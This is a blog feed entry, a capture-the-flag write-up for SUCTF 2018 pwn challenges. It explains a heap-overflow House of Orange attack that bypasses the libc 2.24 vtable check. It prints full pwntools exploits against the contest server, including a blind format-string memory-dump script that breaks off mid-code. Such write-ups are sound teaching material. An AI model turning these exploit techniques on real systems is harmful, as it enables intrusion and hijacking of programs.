<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>p4nda | PWN &amp; security</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://p4nda.top/"/>
  <updated>2018-05-29T13:34:09.941Z</updated>
  <id>http://p4nda.top/</id>
  
  <author>
    <name>P4NDA</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SUCTF 2018部分PWN题复现</title>
    <link href="http://p4nda.top/2018/05/29/suctf2018/"/>
    <id>http://p4nda.top/2018/05/29/suctf2018/</id>
    <published>2018-05-29T12:42:46.000Z</published>
    <updated>2018-05-29T13:34:09.941Z</updated>
    
    <content type="html"><![CDATA[<p>写论文已经两周了orz，今天终于写完了… SUCTF完全靠大佬们带飞，躺进XCTF联赛决赛圈了..</p><p><img src="/img/SUCTF2018/0.png" alt=""></p><h1 id="note"><a href="#note" class="headerlink" title="note"></a>note</h1><p>note这题也是被大佬们秒的比较多的题目了，我个人觉得这次PWN出的还是挺好的。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目有添加、显示、潘多拉魔盒（？）函数：</p><p>add：</p><p><img src="/img/SUCTF2018/1-1.png" alt=""></p><p>show:</p><p><img src="/img/SUCTF2018/1-2.png" alt=""></p><p>pandora box:</p><p><img src="/img/SUCTF2018/1-3.png" alt=""></p><p>可以看出add函数最多可以申请10次（用处不大？），起初初始化程序时申请了两个连续的0x88的块，在pandora box函数中释放，程序不存在修改操作。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞十分明显，在add函数中，对申请堆块的输入使用scanf(“%s”,(&amp;ptr)[i]，显然存在一个堆溢出漏洞，并且对堆块也没有释放操作。看上去让人容易联想起House of orange，其实也是（…）</p><p>题目给的库是libc 2.24的，也就是说必须使用_IO_str_jump的方法利用了。</p><p>简单的House of orange我曾经发过一篇原理在看雪论坛上，一起食用风味更佳：<a href="https://bbs.pediy.com/thread-223334.htm" target="_blank" rel="noopener">从BookWriter看house_of_orange原理【新手向】</a></p><p>具体house of orange的手法是用unsorted bin attack将_IO_list_all覆写成unsorted bin 头节点（libc bss段上的main_arena + 88），此时在出错时最终会调用_IO_flush_all函数，具体是程序会从_IO_list_all中取出保存的_IO_FILE_plus指针以虚表的形式调用_IO_flush_all函数。可攻击的点在于_IO_list_all是一个文件指针单链表，当一个指针不满足时会继续执行下一个指针，可以将指针控制到我们可以控制的堆块中（通过修改size），最终伪造_IO_FILE_plus指针内容，劫持控制流。</p><p>在libc 2.24中，增加的对_IO_FILE_plus中的虚表进行检查，不允许将虚表指向意外的地方：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *</span></span><br><span class="line"><span class="class"><span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="title">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *ptr = (<span class="keyword">const</span> <span class="keyword">char</span> *) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时，大佬们考虑将虚表指向一个libc已存在的虚表，这样可以绕过检查了，由于虚表里指针调用的函数偏移不同，将虚表劫持后，会执行另一个虚表的其他函数，这个虚表被劫持为_IO_str_jumps，当执行想_IO_flush_all，实际上执行了_IO_str_overflow函数，在这个函数中当可以绕过一些判断时，可以执行一个新的函数， new_buf = (char <em>) (</em>((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size); 这个函数同样是相对调用调用，fp时我们可以控制的内存，其内存参数可以通过size计算得到。</p><p>可以看到需要满足的条件时：</p><ol><li>pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)</li></ol><ol><li>new_size &lt; old_blen</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> *new_buf;</span><br><span class="line">  <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">  <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">  _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  new_buf</span><br><span class="line">    = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br><span class="line">  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (old_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">      (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">      <span class="comment">/* Make sure _IO_setb won't try to delete _IO_buf_base. */</span></span><br><span class="line">      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">'\0'</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br></pre></td></tr></table></figure><p>参考<a href="http://simp1e.leanote.com/post/Hctf-2017-babyprintf" target="_blank" rel="noopener">simp1e师傅之前关于Hctf-babyprintf题目的利用</a> ， 可以对参数进行构造：</p><p>2 * old_blen + 100 = addr of “/bin/sh”</p><p>old_blen = (fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base</p><p>构造 (fp)-&gt;_IO_buf_end =（ addr of “/bin/sh” - 100） /2</p><p>(fp)-&gt;_IO_buf_base = 0 即可</p><p>至于如何构造unsorted bin attack可以通过申请堆块，释放原有的堆块，申请小堆块，溢出写来得到，具体exp如下：</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#SUCTF&#123;Me1z1jiu_say_s0rry_LOL&#125;</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./note'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">libc = ELF(<span class="string">'./libc6_2.24-12ubuntu1_amd64.so'</span>)</span><br><span class="line">p = remote(<span class="string">'pwn.suctf.asuri.org'</span>,<span class="number">20003</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Welcome Homura Note Book!   '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'(yes:1)'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">16</span>,<span class="string">'1'</span>*<span class="number">16</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak system address</span></span><br><span class="line">dele()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">offset =  <span class="number">0x7f1b15e2ab78</span><span class="number">-0x7f1b15a66000</span></span><br><span class="line">libc_base = libc_addr - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">sys_addr = libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">malloc_hook = libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">io_list_all = libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">binsh_addr = libc_base+next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">log.info(<span class="string">'sys_addr:%#x'</span> %sys_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake chunk</span></span><br><span class="line">fake_chunk = p64(<span class="number">0x8002</span>)+p64(<span class="number">0x61</span>) <span class="comment">#header</span></span><br><span class="line">fake_chunk += p64(<span class="number">0xddaa</span>)+p64(io_list_all<span class="number">-0x10</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x2</span>)+p64(<span class="number">0xffffffffffffff</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> +p64((binsh_addr<span class="number">-0x64</span>)/<span class="number">2</span>)</span><br><span class="line">fake_chunk = fake_chunk.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_chunk += p64(sys_addr+<span class="number">0x420</span>)</span><br><span class="line">fake_chunk = fake_chunk.ljust(<span class="number">0xc0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">vtable_addr = malloc_hook<span class="number">-13872</span><span class="comment">#+libc.symbols['_IO_str_jumps']</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">16</span> +fake_chunk</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(vtable_addr)</span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">3</span>) </span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># vtable</span></span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line">add(<span class="number">16</span>,payload)<span class="comment">#3</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x200</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="lock2"><a href="#lock2" class="headerlink" title="lock2"></a>lock2</h1><p>Blind pwn …  本队师傅的EXP如下</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(offset)</span>:</span></span><br><span class="line">    <span class="comment"># context.log_level = 'DEBUG'</span></span><br><span class="line">    p = remote(<span class="string">'pwn.suctf.asuri.org'</span>, <span class="number">20001</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'password'</span>)</span><br><span class="line">    p.sendline(<span class="string">'123456'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">leak_format</span><span class="params">(start, length)</span>:</span></span><br><span class="line">        out = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(start, start + length):</span><br><span class="line">            out += <span class="string">'-%%%d$p'</span> % i</span><br><span class="line">        <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">    <span class="comment"># for i in range(20):</span></span><br><span class="line">    <span class="comment">#     p.recvuntil('cmd:')</span></span><br><span class="line">    <span class="comment">#     format_string = leak_format(2 + 4*i, 4)</span></span><br><span class="line">    <span class="comment">#     p.sendline(format_string)</span></span><br><span class="line">    <span class="comment">#     print p.recvline()</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_cmd</span><span class="params">(p, cmd)</span>:</span></span><br><span class="line">        p.recvuntil(<span class="string">'cmd:'</span>)</span><br><span class="line">        p.sendline(cmd)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">leak_stack</span><span class="params">(p, index)</span>:</span></span><br><span class="line">        p.recvuntil(<span class="string">'cmd:'</span>)</span><br><span class="line">        p.sendline(<span class="string">"%%%d$pAAA"</span> % index)</span><br><span class="line">        p.recvuntil(<span class="string">'cmd:'</span>)</span><br><span class="line">        <span class="keyword">return</span> int(p.recvuntil(<span class="string">'AAA'</span>, drop=<span class="keyword">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">leak_mem</span><span class="params">(p, addr)</span>:</span></span><br><span class="line">        buf = <span class="string">'%7$s'</span> + <span class="string">'=--='</span> + p64(addr) + <span class="string">'bb'</span> </span><br><span class="line">        run_cmd(p, buf)</span><br><span class="line">        p.recvuntil(<span class="string">'cmd:'</span>)</span><br><span class="line">        <span class="keyword">return</span> p.recvuntil(<span class="string">'=--='</span>, drop=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_mem</span><span class="params">(p, addr, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> value != <span class="number">0</span>:</span><br><span class="line">            buf = (<span class="string">'%%%dc%%7$hn'</span> % value).ljust(<span class="number">8</span>, <span class="string">'='</span>) + p64(addr) + <span class="string">'bb'</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            buf = <span class="string">'%%7$hn'</span>.ljust(<span class="number">8</span>, <span class="string">'='</span>) + p64(addr) + <span class="string">'bb'</span> </span><br><span class="line"></span><br><span class="line">        run_cmd(p, buf)</span><br><span class="line">        p.recvuntil(<span class="string">'cmd:'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_codebase</span><span class="params">(p)</span>:</span></span><br><span class="line">        code_base = leak_stack(p, <span class="number">16</span>) &amp; (~<span class="number">0xfff</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            <span class="keyword">print</span> hex(code_base)</span><br><span class="line">            data = leak_mem(p, code_base)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'ELF'</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">print</span> data</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                code_base -= <span class="number">0x1000</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'code_base is '</span> + hex(code_base)</span><br><span class="line">        <span class="keyword">return</span> code_base</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumpmem</span><span class="params">(offset, length)</span>:</span></span><br><span class="line">        p = remote(<span class="string">'pwn.suctf.asuri.org'</span>, <span class="number">20001</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'password'</span>)</span><br><span class="line">        p.sendline(<span class="string">'123456'</span>)</span><br><span class="line">        </span><br><span class="line">        code_base = get_codebase(p)</span><br><span class="line"></span><br><span class="line">        dump = <span class="string">''</span></span><br><span class="line">        addr = code_base + offset</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> len(dump) &lt; length:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'\x0a'</span> <span class="keyword">in</span> p64(addr):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'bad addr'</span>, hex(addr)</span><br><span class="line">                addr += <span class="number">1</span></span><br><span class="line">                dump += <span class="string">'\x00'</span></span><br><span class="line">        </span><br><span class="line">            data = leak_mem(p, addr)</span><br><span class="line">            data += <span class="string">'\x00'</span></span><br><span class="line">            dump += data</span><br><span class="line">            addr += len(data)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">print</span> hex(addr)</span><br><span class="line">            <span class="keyword">if</span> count % <span class="number">200</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">print</span> dump.encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> dump</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumpelf</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">            dumpfile = <span class="string">'dump%02d'</span> % i</span><br><span class="line">            <span class="keyword">if</span> os.path.exists(dumpfile):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'dumpfile %s exists'</span> % dumpfile</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            size = <span class="number">0x400</span></span><br><span class="line">            dump = dumpmem(i*size, size)[:size]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'dump length is '</span>, len(dump)</span><br><span class="line">            open(dumpfile, <span class="string">'wb'</span>).write(dump)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># dumpelf()</span></span><br><span class="line">    <span class="comment"># for i in range(2, 20):</span></span><br><span class="line">    <span class="comment">#     try:</span></span><br><span class="line">    <span class="comment">#         print i, hex(leak_stack(i))</span></span><br><span class="line">    <span class="comment">#     except Exception as e:</span></span><br><span class="line">    <span class="comment">#         print e</span></span><br><span class="line"></span><br><span class="line">    canary = leak_stack(p, <span class="number">15</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'canary is '</span>, hex(canary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'K  '</span>)</span><br><span class="line">    addr = int(p.recvuntil(<span class="string">'--'</span>, drop=<span class="keyword">True</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_byte</span><span class="params">(byte)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span 